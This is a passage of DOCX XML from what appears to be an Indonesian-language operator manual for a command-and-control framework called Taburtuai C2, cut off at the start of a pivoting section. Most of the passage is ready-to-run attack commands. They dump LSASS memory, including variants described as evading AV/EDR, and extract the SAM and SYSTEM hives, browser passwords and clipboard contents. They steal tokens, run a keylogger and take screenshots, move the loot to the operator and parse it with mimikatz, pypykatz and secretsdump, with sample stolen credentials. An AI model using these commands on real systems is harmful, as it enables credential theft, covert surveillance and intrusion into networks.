      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>LSASS (Local Security Authority Subsystem Service) menyimpan credential cache termasuk NTLM hashes, Kerberos tickets, dan plaintext password (jika WDigest aktif). Dump LSASS adalah teknik credential theft paling umum.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump LSASS ke file (method default: minidump)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass &lt;agent-id&gt; --output "C:\Temp\lsass.dmp"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Download hasil dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\lsass.dmp" ./loot/lsass.dmp</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Parse di mesin operator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dengan Mimikatz:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit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Dengan pypykatz (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>pypykatz lsa minidump lsass.dmp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Method Alternatif LSASS Dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>AV/EDR sering memonitor akses langsung ke LSASS. Metode alternatif menggunakan teknik tidak langsung untuk menghindari deteksi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump via handle duplication (bypass LSASS protection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass-dup &lt;agent-id&gt; --output "C:\Temp\lsass_dup.dmp"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Dump via Windows Error Reporting (WER) — sangat stealth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass-wer &lt;agent-id&gt; --output "C:\Temp\" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Buat crash report LSASS, WER menyimpan dump otomatis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>SAM Database</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>SAM (Security Account Manager) menyimpan local user account credentials. Untuk mendapatkannya, harus ada akses SYSTEM karena SAM di-lock oleh OS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump SAM + SYSTEM hive (butuh SYSTEM token)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds sam &lt;agent-id&gt; --output-dir "C:\Temp"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Download hasilnya</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\SAM" ./loot/SAM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\SYSTEM" ./loot/SYSTEM</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Parse di mesin operator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>impacket-secretsdump -sam ./loot/SAM -system ./loot/SYSTEM LOCAL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Browser Credentials</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Browser modern menyimpan password yang di-enkripsi dengan DPAPI menggunakan kunci yang terikat pada user account. Agent dapat mendekripsi credentials ini karena berjalan dalam context user yang sama.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump credentials dari semua browser yang terinstall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds browser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Filter browser tertentu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds browser &lt;agent-id&gt; --browser chrome --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds browser &lt;agent-id&gt; --browser edge --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds browser &lt;agent-id&gt; --browser firefox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contoh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [Chrome] https://mail.corp.com  john.doe@corp.com  CorpMail@2026!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [Chrome] https://github.com    johndoe            gh_token_abc123...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Clipboard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Ambil isi clipboard saat ini</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds clipboard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Berguna untuk menangkap password yang di-copy-paste oleh pengguna</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 12.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LSASS Credential Extraction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Pastikan agent berjalan dengan privileges yang cukup (ideally SYSTEM via token steal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid &lt;SYSTEM_PID&gt;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Dump LSASS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass &lt;agent-id&gt; --output "C:\Temp\lsass.dmp"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Download dump ke mesin operator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files download &lt;agent-id&gt; "C:\Temp\lsass.dmp" ./loot/lsass.dmp</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Parse credentials (jalankan di luar C2 console).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>pypykatz lsa minidump ./loot/lsass.dmp</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Catat semua credential yang didapat untuk digunakan di fase lateral movement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 13 — RECONNAISSANCE (SCREENSHOT &amp; KEYLOGGER)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Screenshot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Ambil screenshot layar target untuk mendapatkan konteks visual tentang apa yang sedang dilakukan pengguna dan aplikasi apa yang terbuka.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Ambil screenshot (disimpan sebagai PNG)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>screenshot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base64 PNG yang bisa di-decode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Operator console otomatis menyimpan ke ./screenshots/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Keylogger</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Keylogger mencatat semua keystroke pengguna untuk menangkap password, konten email, chat, dan informasi sensitif lainnya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Mulai keylogger (background, tidak menghalangi command lain)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>keylog start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Keylog dengan durasi terbatas (60 detik)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>keylog start &lt;agent-id&gt; --duration 60 --wait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Ambil hasil keylog</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>keylog dump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contoh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [10:23:41] [explorer.exe] user typed: "CorpMail@2026!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># [10:23:55] [chrome.exe]   user typed: "john.doe@corp.com"</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Hentikan keylogger</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>keylog stop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Hapus log di memori agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>keylog clear &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 14 — NETWORK &amp; PIVOTING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Pivoting menggunakan agent yang sudah terkompromi sebagai jembatan untuk mengakses segmen jaringan internal yang tidak bisa diakses langsung dari internet. Taburtuai C2 mendukung beberapa mekanisme pivot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Network Scanning (NetScan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Scan port TCP dari posisi agent untuk mendiscovery host dan service di jaringan internal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Scan subnet standar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
